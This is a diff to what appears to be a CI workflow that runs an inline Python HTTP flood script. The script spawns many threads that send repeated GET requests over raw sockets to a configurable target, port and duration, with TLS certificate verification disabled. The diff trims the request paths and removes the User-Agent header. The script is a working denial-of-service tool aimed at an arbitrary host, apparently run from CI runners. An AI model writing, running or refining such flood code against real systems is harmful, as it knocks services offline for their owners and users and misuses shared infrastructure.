@@ -37,7 +37,7 @@ jobs:
           python3 -c "
           import socket,threading,random,time,ssl,os
           h=os.environ['TARGET'];p=int(os.environ['PORT']);t=int(os.environ['THREADS']);d=int(os.environ['DURATION'])
-          UA=['Mozilla/5.0','Mozilla/5.0 (Macintosh)'];P=['/','/index.html','/robots.txt'];s=0;l=threading.Lock()
+          UA=['Mozilla/5.0','Mozilla/5.0 (Macintosh)'];P=['/','/index.html'];s=0;l=threading.Lock()
           def w():
               global s;e=time.time()+d
               while time.time()<e:
@@ -47,7 +47,6 @@ jobs:
                           c=ssl.create_default_context();c.check_hostname=False;c.verify_mode=ssl.CERT_NONE;so=c.wrap_socket(so,server_hostname=h)
                       so.send(f'GET {random.choice(P)} HTTP/1.1
 Host: {h}
-User-Agent: {random.choice(UA)}
 Connection: keep-alive
 
 '.encode());so.close()
